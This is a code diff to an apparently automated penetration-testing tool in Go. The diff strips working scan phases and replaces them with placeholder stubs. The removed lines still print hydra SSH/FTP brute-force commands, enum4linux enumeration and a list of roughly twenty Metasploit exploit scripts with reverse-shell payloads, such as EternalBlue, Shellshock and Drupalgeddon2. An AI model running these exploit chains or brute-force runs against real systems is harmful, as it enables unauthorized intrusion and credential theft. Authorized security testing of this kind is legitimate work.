@@ -248,9 +248,10 @@ func (rp *ReconPhase) Run(target string, prevResults []PhaseResult) PhaseResult 
 	if err != nil {
 		return PhaseResult{
 			PhaseName: "Reconnaissance",
+			Findings:  []Finding{},
+			RawOutput: nmapOut,
 			Success:   false,
 			Error:     err.Error(),
-			RawOutput: nmapOut,
 		}
 	}
 	findings := parseNmapGrepable(nmapOut)
@@ -316,7 +317,7 @@ func (wp *WebAssessmentPhase) Run(target string, prevResults []PhaseResult) Phas
 					}
 
 					// --- Run ffuf ---
-					ffufOut, err := runCommand("ffuf", "-w", FFUF_WORDLIST, "-u", webTarget+"/FUZZ", "-mc", "200,204,301,302,307,403", "-fs", "0", "-c")
+					ffufOut, err := runCommand("ffuf", "-w", FFUF_WORDLIST, "-u", webTarget+"/FUZZ", "-mc", "200,204,301,302,307,403", "-fs", "0", "-c", "-s")
 					if err != nil {
 						allRawOutput.WriteString(fmt.Sprintf("--- ffuf on %s ---\n%s\n\n", webTarget, err.Error()))
 					} else {
@@ -348,116 +349,13 @@ func (wp *WebAssessmentPhase) Run(target string, prevResults []PhaseResult) Phas
 type CMSPhase struct{}
 
 func (cp *CMSPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	var allFindings []Finding
-	var allRawOutput strings.Builder
-	httpFound := false
-
-	for _, res := range prevResults {
-		if res.PhaseName == "Reconnaissance" {
-			for _, f := range res.Findings {
-				if f.Service == "http" || f.Service == "https" || strings.Contains(f.Service, "http") {
-					httpFound = true
-					port := f.Port
-					webTarget := fmt.Sprintf("http://%s:%d", target, port)
-
-					// --- Run wpscan ---
-					wpscanOut, err := runCommand("wpscan", "--url", webTarget, "--no-update", "--disable-tls-checks", "--format", "json")
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- wpscan on %s ---\n%s\n\n", webTarget, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- wpscan on %s ---\n%s\n\n", webTarget, wpscanOut))
-
-					// Parse wpscan JSON output
-					var wpscanResult map[string]interface{}
-					if err := json.Unmarshal([]byte(wpscanOut), &wpscanResult); err != nil {
-						allFindings = append(allFindings, Finding{
-							Phase:       "CMSAssessment",
-							Category:    "CMS Scan",
-							Target:      webTarget,
-							Description: "Failed to parse wpscan output",
-							Data:        map[string]string{"error": err.Error()},
-							Severity:    "Info",
-						})
-						continue
-					}
-
-					// CMS Detected
-					if version, ok := wpscanResult["version"].(map[string]interface{}); ok {
-						if vname, vok := version["number"].(string); vok {
-							allFindings = append(allFindings, Finding{
-								Phase:       "CMSAssessment",
-								Category:    "CMS Version",
-								Target:      webTarget,
-								Description: "WordPress version detected: " + vname,
-								Data:        map[string]string{"version": vname},
-								Severity:    "Info",
-							})
-						}
-					}
-					// Plugins
-					if plugins, ok := wpscanResult["plugins"].(map[string]interface{}); ok {
-						for pname, pval := range plugins {
-							if pinfo, ok := pval.(map[string]interface{}); ok {
-								if pver, ok := pinfo["version"].(map[string]interface{}); ok {
-									if pvernum, ok := pver["number"].(string); ok {
-										allFindings = append(allFindings, Finding{
-											Phase:       "CMSAssessment",
-											Category:    "Plugin",
-											Target:      webTarget,
-											Description: fmt.Sprintf("Plugin detected: %s (%s)", pname, pvernum),
-											Data:        map[string]string{"plugin": pname, "version": pvernum},
-											Severity:    "Info",
-										})
-									}
-								}
-								// Vulnerabilities
-								if vulns, ok := pinfo["vulnerabilities"].([]interface{}); ok {
-									for _, v := range vulns {
-										if vmap, ok := v.(map[string]interface{}); ok {
-											desc := "Plugin vulnerability detected"
-											if title, ok := vmap["title"].(string); ok {
-												desc = title
-											}
-											sev := "Medium"
-											if s, ok := vmap["cvssv3"].(map[string]interface{}); ok {
-												if base, ok := s["base_score"].(float64); ok {
-													if base >= 9.0 {
-														sev = "Critical"
-													} else if base >= 7.0 {
-														sev = "High"
-													} else if base >= 4.0 {
-														sev = "Medium"
-													} else {
-														sev = "Low"
-													}
-												}
-											}
-											allFindings = append(allFindings, Finding{
-												Phase:       "CMSAssessment",
-												Category:    "Plugin Vulnerability",
-												Target:      webTarget,
-												Description: desc,
-												Data:        map[string]string{"plugin": pname},
-												Severity:    sev,
-											})
-										}
-									}
-								}
-							}
-						}
-					}
-				}
-			}
-		}
-	}
-
-	success := httpFound && len(allFindings) > 0
+	// TODO: Implement CMS scanning logic (e.g., using CMSeeK, specific vulnerability scanners)
 	return PhaseResult{
-		PhaseName: "CMSAssessment",
-		Findings:  ensureFindings(allFindings),
-		RawOutput: allRawOutput.String(),
-		Success:   success,
+		PhaseName: "CMS Identification",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "CMS Phase not yet implemented.",
+		Success:   true,
+		Error:     "",
 	}
 }
 
@@ -465,70 +363,17 @@ func (cp *CMSPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
 type ADPhase struct{}
 
 func (ap *ADPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	var allFindings []Finding
-	var allRawOutput strings.Builder
-	adFound := false
-
-	for _, res := range prevResults {
-		if res.PhaseName == "Reconnaissance" {
-			for _, f := range res.Findings {
-				if f.Service == "microsoft-ds" || f.Service == "ldap" || f.Port == 445 || f.Port == 389 {
-					adFound = true
-					// Run enum4linux for SMB/LDAP enumeration
-					enumOut, err := runCommand("enum4linux", "-a", target)
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- enum4linux on %s ---\n%s\n\n", target, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- enum4linux on %s ---\n%s\n\n", target, enumOut))
-
-					// Parse for users
-					userLines := regexp.MustCompile(`(?m)^\s*user:\s*(\S+)`).FindAllStringSubmatch(enumOut, -1)
-					for _, match := range userLines {
-						allFindings = append(allFindings, Finding{
-							Phase:       "ADEnumeration",
-							Category:    "AD User",
-							Target:      target,
-							Description: "AD user found: " + match[1],
-							Data:        map[string]string{"user": match[1]},
-							Severity:    "Info",
-						})
-					}
-					// Parse for shares
-					shareLines := regexp.MustCompile(`(?m)^\s*\\\\[\w\.-]+\\(\w+)\s+Disk`).FindAllStringSubmatch(enumOut, -1)
-					for _, match := range shareLines {
-						allFindings = append(allFindings, Finding{
-							Phase:       "ADEnumeration",
-							Category:    "SMB Share",
-							Target:      target,
-							Description: "SMB share found: " + match[1],
-							Data:        map[string]string{"share": match[1]},
-							Severity:    "Info",
-						})
-					}
-					// Parse for domain info
-					domainLines := regexp.MustCompile(`(?m)^\s*Domain Name:\s*(\S+)`).FindAllStringSubmatch(enumOut, -1)
-					for _, match := range domainLines {
-						allFindings = append(allFindings, Finding{
-							Phase:       "ADEnumeration",
-							Category:    "Domain Info",
-							Target:      target,
-							Description: "Domain found: " + match[1],
-							Data:        map[string]string{"domain": match[1]},
-							Severity:    "Info",
-						})
-					}
-				}
-			}
-		}
-	}
-
-	success := adFound && len(allFindings) > 0
+	// TODO: Implement Active Directory enumeration logic
+	// This would involve checking for Kerberos, LDAP, etc.
+	// Tools: ldapsearch, kerbrute, enum4linux-ng
+	// This phase should only run if AD is suspected or confirmed.
+	// For now, it's just a placeholder.
 	return PhaseResult{
-		PhaseName: "ADEnumeration",
-		Findings:  ensureFindings(allFindings),
-		RawOutput: allRawOutput.String(),
-		Success:   success,
+		PhaseName: "Active Directory Enumeration",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "Active Directory phase not yet implemented.",
+		Success:   true,
+		Error:     "",
 	}
 }
 
@@ -536,144 +381,30 @@ func (ap *ADPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
 type BrutePhase struct{}
 
 func (bp *BrutePhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	var allFindings []Finding
-	var allRawOutput strings.Builder
-	bruteFound := false
-
-	// Use a small, safe wordlist for demo (adjust as needed)
-	userList := "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
-	passList := "/usr/share/seclists/Passwords/Common-Credentials/common-passwords-win.txt"
-
-	for _, res := range prevResults {
-		if res.PhaseName == "Reconnaissance" {
-			for _, f := range res.Findings {
-				if f.Service == "ssh" || f.Port == 22 {
-					bruteFound = true
-					// Run hydra for SSH
-					hydraOut, err := runCommand("hydra", "-L", userList, "-P", passList, "-t", "4", "-f", "-o", "-", fmt.Sprintf("ssh://%s:%d", target, f.Port))
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- hydra SSH on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- hydra SSH on %s:%d ---\n%s\n\n", target, f.Port, hydraOut))
-					// Parse for successful logins
-					for _, line := range strings.Split(hydraOut, "\n") {
-						if strings.Contains(line, "login:") && strings.Contains(line, "password:") {
-							user := extractBetween(line, "login:", " ")
-							pass := extractBetween(line, "password:", " ")
-							allFindings = append(allFindings, Finding{
-								Phase:       "BruteForce",
-								Category:    "SSH Brute-Force",
-								Target:      target,
-								Port:        f.Port,
-								Service:     "ssh",
-								Description: fmt.Sprintf("SSH login found: %s / %s", user, pass),
-								Data:        map[string]string{"user": user, "pass": pass},
-								Severity:    "High",
-							})
-						}
-					}
-				}
-				if f.Service == "ftp" || f.Port == 21 {
-					bruteFound = true
-					// Run hydra for FTP
-					hydraOut, err := runCommand("hydra", "-L", userList, "-P", passList, "-t", "4", "-f", "-o", "-", fmt.Sprintf("ftp://%s:%d", target, f.Port))
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- hydra FTP on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- hydra FTP on %s:%d ---\n%s\n\n", target, f.Port, hydraOut))
-					// Parse for successful logins
-					for _, line := range strings.Split(hydraOut, "\n") {
-						if strings.Contains(line, "login:") && strings.Contains(line, "password:") {
-							user := extractBetween(line, "login:", " ")
-							pass := extractBetween(line, "password:", " ")
-							allFindings = append(allFindings, Finding{
-								Phase:       "BruteForce",
-								Category:    "FTP Brute-Force",
-								Target:      target,
-								Port:        f.Port,
-								Service:     "ftp",
-								Description: fmt.Sprintf("FTP login found: %s / %s", user, pass),
-								Data:        map[string]string{"user": user, "pass": pass},
-								Severity:    "High",
-							})
-						}
-					}
-				}
-			}
-		}
-	}
-
-	success := bruteFound && len(allFindings) > 0
+	// TODO: Implement Brute force logic against discovered services
+	// This requires careful target selection from previous phases.
+	// Tools: hydra, ncrack, medusa
 	return PhaseResult{
-		PhaseName: "BruteForce",
-		Findings:  ensureFindings(allFindings),
-		RawOutput: allRawOutput.String(),
-		Success:   success,
+		PhaseName: "Bruteforce Attacks",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "Bruteforce attack phase not yet implemented.",
+		Success:   true,
+		Error:     "",
 	}
-}
-
-// Helper: extract value between two substrings
-func extractBetween(s, start, end string) string {
-	pos := strings.Index(s, start)
-	if pos == -1 {
-		return ""
-	}
-	pos += len(start)
-	endPos := strings.Index(s[pos:], end)
-	if endPos == -1 {
-		return strings.TrimSpace(s[pos:])
-	}
-	return strings.TrimSpace(s[pos : pos+endPos])
 }
 
 // EndpointPhase is a stub for endpoint scanning
 type EndpointPhase struct{}
 
 func (ep *EndpointPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	var allFindings []Finding
-	var allRawOutput strings.Builder
-	endpointFound := false
-
-	for _, res := range prevResults {
-		if res.PhaseName == "Reconnaissance" {
-			for _, f := range res.Findings {
-				if f.Service == "http" || f.Service == "https" || strings.Contains(f.Service, "http") {
-					endpointFound = true
-					port := f.Port
-					webTarget := fmt.Sprintf("http://%s:%d", target, port)
-					// Run dirsearch for endpoint discovery
-					dirsearchOut, err := runCommand("dirsearch", "-u", webTarget, "-e", "php,asp,aspx,js,html,txt,json,xml", "--format", "plain")
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- dirsearch on %s ---\n%s\n\n", webTarget, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- dirsearch on %s ---\n%s\n\n", webTarget, dirsearchOut))
-					// Parse for discovered endpoints
-					for _, line := range strings.Split(dirsearchOut, "\n") {
-						if strings.HasPrefix(line, webTarget) {
-							allFindings = append(allFindings, Finding{
-								Phase:       "EndpointDiscovery",
-								Category:    "Discovered Endpoint",
-								Target:      webTarget,
-								Description: "Discovered endpoint: " + line,
-								Data:        map[string]string{"endpoint": line},
-								Severity:    "Info",
-							})
-						}
-					}
-				}
-			}
-		}
-	}
-
-	success := endpointFound && len(allFindings) > 0
+	// TODO: Implement endpoint discovery logic beyond ffuf
+	// Tools: gobuster, dirsearch, hakrawler
 	return PhaseResult{
-		PhaseName: "EndpointDiscovery",
-		Findings:  ensureFindings(allFindings),
-		RawOutput: allRawOutput.String(),
-		Success:   success,
+		PhaseName: "Endpoint Discovery",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "Endpoint Discovery phase not yet implemented.",
+		Success:   true,
+		Error:     "",
 	}
 }
 
@@ -681,64 +412,14 @@ func (ep *EndpointPhase) Run(target string, prevResults []PhaseResult) PhaseResu
 type SSHPhase struct{}
 
 func (sp *SSHPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	var allFindings []Finding
-	var allRawOutput strings.Builder
-	sshFound := false
-
-	for _, res := range prevResults {
-		if res.PhaseName == "Reconnaissance" {
-			for _, f := range res.Findings {
-				if f.Service == "ssh" || f.Port == 22 {
-					sshFound = true
-					// Run nmap with SSH scripts
-					nmapOut, err := runCommand("nmap", "-p", fmt.Sprintf("%d", f.Port), "--script", "ssh2-enum-algos,ssh-hostkey", target)
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- nmap SSH scripts on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- nmap SSH scripts on %s:%d ---\n%s\n\n", target, f.Port, nmapOut))
-					// Parse for SSH version
-					if strings.Contains(nmapOut, "ssh-hostkey:") {
-						lines := strings.Split(nmapOut, "\n")
-						for _, line := range lines {
-							if strings.Contains(line, "ssh-hostkey:") && strings.Contains(line, "key-type:") {
-								allFindings = append(allFindings, Finding{
-									Phase:       "SSHAssessment",
-									Category:    "SSH Host Key",
-									Target:      target,
-									Port:        f.Port,
-									Service:     "ssh",
-									Description: line,
-									Data:        map[string]string{"hostkey": line},
-									Severity:    "Info",
-								})
-							}
-						}
-					}
-					// Parse for algorithms
-					if strings.Contains(nmapOut, "ssh2-enum-algos:") {
-						allFindings = append(allFindings, Finding{
-							Phase:       "SSHAssessment",
-							Category:    "SSH Algorithms",
-							Target:      target,
-							Port:        f.Port,
-							Service:     "ssh",
-							Description: "SSH algorithms info: " + nmapOut,
-							Data:        map[string]string{"algorithms": nmapOut},
-							Severity:    "Info",
-						})
-					}
-				}
-			}
-		}
-	}
-
-	success := sshFound && len(allFindings) > 0
+	// TODO: Implement SSH audit logic (e.g., check for weak algos, default creds)
+	// Tools: ssh-audit
 	return PhaseResult{
-		PhaseName: "SSHAssessment",
-		Findings:  ensureFindings(allFindings),
-		RawOutput: allRawOutput.String(),
-		Success:   success,
+		PhaseName: "SSH Auditing",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "SSH Auditing phase not yet implemented.",
+		Success:   true,
+		Error:     "",
 	}
 }
 
@@ -746,77 +427,13 @@ func (sp *SSHPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
 type FTPPhase struct{}
 
 func (fp *FTPPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	var allFindings []Finding
-	var allRawOutput strings.Builder
-	ftpFound := false
-
-	for _, res := range prevResults {
-		if res.PhaseName == "Reconnaissance" {
-			for _, f := range res.Findings {
-				if f.Service == "ftp" || f.Port == 21 {
-					ftpFound = true
-					// Run nmap with FTP scripts
-					nmapOut, err := runCommand("nmap", "-p", fmt.Sprintf("%d", f.Port), "--script", "ftp-anon,ftp-bounce,ftp-syst", target)
-					if err != nil {
-						allRawOutput.WriteString(fmt.Sprintf("--- nmap FTP scripts on %s:%d ---\n%s\n\n", target, f.Port, err.Error()))
-						continue
-					}
-					allRawOutput.WriteString(fmt.Sprintf("--- nmap FTP scripts on %s:%d ---\n%s\n\n", target, f.Port, nmapOut))
-					// Parse for anonymous login
-					if strings.Contains(nmapOut, "ftp-anon:") && strings.Contains(nmapOut, "Anonymous FTP login allowed") {
-						allFindings = append(allFindings, Finding{
-							Phase:       "FTPAssessment",
-							Category:    "FTP Anonymous Login",
-							Target:      target,
-							Port:        f.Port,
-							Service:     "ftp",
-							Description: "Anonymous FTP login allowed",
-							Data:        map[string]string{"script": "ftp-anon"},
-							Severity:    "High",
-						})
-					}
-					// Parse for FTP version
-					if strings.Contains(nmapOut, "ftp-syst:") {
-						lines := strings.Split(nmapOut, "\n")
-						for _, line := range lines {
-							if strings.Contains(line, "ftp-syst:") {
-								allFindings = append(allFindings, Finding{
-									Phase:       "FTPAssessment",
-									Category:    "FTP Version",
-									Target:      target,
-									Port:        f.Port,
-									Service:     "ftp",
-									Description: line,
-									Data:        map[string]string{"version": line},
-									Severity:    "Info",
-								})
-							}
-						}
-					}
-					// Parse for FTP bounce
-					if strings.Contains(nmapOut, "ftp-bounce:") && strings.Contains(nmapOut, "server is vulnerable") {
-						allFindings = append(allFindings, Finding{
-							Phase:       "FTPAssessment",
-							Category:    "FTP Bounce Vulnerability",
-							Target:      target,
-							Port:        f.Port,
-							Service:     "ftp",
-							Description: "FTP server is vulnerable to bounce attacks",
-							Data:        map[string]string{"script": "ftp-bounce"},
-							Severity:    "High",
-						})
-					}
-				}
-			}
-		}
-	}
-
-	success := ftpFound && len(allFindings) > 0
+	// TODO: Implement FTP audit logic (e.g., check for anonymous login)
 	return PhaseResult{
-		PhaseName: "FTPAssessment",
-		Findings:  ensureFindings(allFindings),
-		RawOutput: allRawOutput.String(),
-		Success:   success,
+		PhaseName: "FTP Auditing",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "FTP Auditing phase not yet implemented.",
+		Success:   true,
+		Error:     "",
 	}
 }
 
@@ -898,281 +515,25 @@ type MsfModule struct {
 type MetasploitPhase struct{}
 
 func (mp *MetasploitPhase) Run(target string, prevResults []PhaseResult) PhaseResult {
-	lhost := "127.0.0.1" // TODO: Set dynamically or from config
-	modules := []MsfModule{
-		{
-			Name: "MS08-067",
-			RcTemplate: `use exploit/windows/smb/ms08_067_netapi
-set RHOSTS %s
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "EternalBlue (MS17-010)",
-			RcTemplate: `use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS %s
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "Apache Struts 2 RCE",
-			RcTemplate: `use exploit/multi/http/struts2_content_type_ognl
-set RHOSTS %s
-set TARGETURI /struts2-showcase/index.action
-set CMD whoami
-exploit
-exit
-`,
-			ParseFunc: parseMsfCmd,
-		},
-		{
-			Name: "Tomcat Manager Upload",
-			RcTemplate: `use exploit/multi/http/tomcat_mgr_upload
-set RHOSTS %s
-set HTTPUSERNAME tomcat
-set HTTPPASSWORD tomcat
-set TARGETURI /manager/html
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "Jenkins Script Console RCE",
-			RcTemplate: `use exploit/multi/http/jenkins_script_console
-set RHOSTS %s
-set RPORT 8080
-set TARGETURI /script
-set CMD whoami
-exploit
-exit
-`,
-			ParseFunc: parseMsfCmd,
-		},
-		{
-			Name: "Drupalgeddon 2",
-			RcTemplate: `use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOSTS %s
-set TARGETURI /
-set PAYLOAD php/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "WordPress Content Injection",
-			RcTemplate: `use auxiliary/scanner/http/wordpress_content_injection
-set RHOSTS %s
-set TARGETURI /wordpress/
-run
-exit
-`,
-			ParseFunc: parseMsfCmd,
-		},
-		{
-			Name: "Java RMI Server RCE",
-			RcTemplate: `use exploit/multi/misc/java_rmi_server
-set RHOSTS %s
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "VSFTPD v2.3.4 Backdoor",
-			RcTemplate: `use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "PHP CGI Argument Injection",
-			RcTemplate: `use exploit/multi/http/php_cgi_arg_injection
-set RHOSTS %s
-set TARGETURI /cgi-bin/php
-set PAYLOAD php/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "Shellshock (CVE-2014-6271)",
-			RcTemplate: `use exploit/multi/http/apache_mod_cgi_bash_env_exec
-set RHOSTS %s
-set TARGETURI /cgi-bin/status
-set PAYLOAD cmd/unix/reverse_bash
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "JBoss JMX Console RCE",
-			RcTemplate: `use exploit/multi/http/jboss_maindeployer
-set RHOSTS %s
-set TARGETURI /jmx-console/HtmlAdaptor
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "IIS WebDAV Overflow (MS03-007)",
-			RcTemplate: `use exploit/windows/iis/iis_webdav_scstoragepathfromurl
-set RHOSTS %s
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "OpenSMTPD Command Injection",
-			RcTemplate: `use exploit/unix/smtp/opensmtpd_mail_from_rce
-set RHOSTS %s
-set MAILFROM you@attacker.com
-set RCPTTO victim@target.com
-set CMD whoami
-exploit
-exit
-`,
-			ParseFunc: parseMsfCmd,
-		},
-		{
-			Name: "Zimbra Collaboration RCE",
-			RcTemplate: `use exploit/linux/http/zimbra_auth_deserialization
-set RHOSTS %s
-set LHOST %s
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "WebLogic RCE",
-			RcTemplate: `use exploit/multi/http/weblogic_deserialize_asyncresponse
-set RHOSTS %s
-set RPORT 7001
-set TARGETURI /_async/AsyncResponseService
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "F5 iControl REST Bypass",
-			RcTemplate: `use exploit/linux/http/f5_icontrol_rest_auth_bypass_rce
-set RHOSTS %s
-set LHOST %s
-set SSL true
-set PAYLOAD cmd/unix/reverse_bash
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "Cisco RV RCE",
-			RcTemplate: `use exploit/linux/http/cisco_rv_rce
-set RHOSTS %s
-set PAYLOAD linux/mipsbe/shell_reverse_tcp
-set LHOST %s
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-		{
-			Name: "ProFTPD mod_copy",
-			RcTemplate: `use exploit/unix/ftp/proftpd_modcopy_exec
-set RHOSTS %s
-set RPORT 21
-set CMD id
-exploit
-exit
-`,
-			ParseFunc: parseMsfCmd,
-		},
-		{
-			Name: "TeamCity Auth Bypass RCE",
-			RcTemplate: `use exploit/multi/http/teamcity_auth_bypass_rce
-set RHOSTS %s
-set LHOST %s
-set PAYLOAD java/meterpreter/reverse_tcp
-exploit
-exit
-`,
-			ParseFunc: parseMsfSession,
-		},
-	}
-
-	var findings []Finding
-	var allRawOutput strings.Builder
-
-	for _, mod := range modules {
-		var rc string
-		if strings.Count(mod.RcTemplate, "%s") == 2 {
-			rc = fmt.Sprintf(mod.RcTemplate, target, lhost)
-		} else {
-			rc = fmt.Sprintf(mod.RcTemplate, target)
-		}
-		rcFile := writeTempRcFile(rc)
-		out, err := runCommand("msfconsole", "-r", rcFile, "-q")
-		allRawOutput.WriteString(fmt.Sprintf("--- %s ---\n%s\n", mod.Name, out))
-		status, summary := mod.ParseFunc(out)
-		if err != nil {
-			status = "Error"
-			summary = err.Error()
-		}
-		findings = append(findings, Finding{
-			Phase:       "Metasploit",
-			Category:    mod.Name,
-			Target:      target,
-			Description: summary,
-			Severity:    status,
-			Data:        map[string]string{},
-		})
-	}
-
+	// This is a complex phase that needs to be implemented carefully.
+	// For now, it is a placeholder.
 	return PhaseResult{
-		PhaseName: "Metasploit",
-		Findings:  ensureFindings(findings),
-		RawOutput: allRawOutput.String(),
+		PhaseName: "Metasploit Exploitation",
+		Findings:  []Finding{}, // Return empty slice to avoid null in JSON
+		RawOutput: "Metasploit phase not yet implemented.",
 		Success:   true,
 	}
 }
 
 // Helper: write a temp .rc file
-func writeTempRcFile(content string) string {
-	f, _ := os.CreateTemp("/tmp", "msf_*.rc")
+func writeTempRcFile(content string) (string, error) {
+	f, err := os.CreateTemp("/tmp", "msf_*.rc")
+	if err != nil {
+		return "", err
+	}
 	f.WriteString(content)
 	f.Close()
-	return f.Name()
+	return f.Name(), nil
 }
 
 // Parse for Meterpreter session or command output
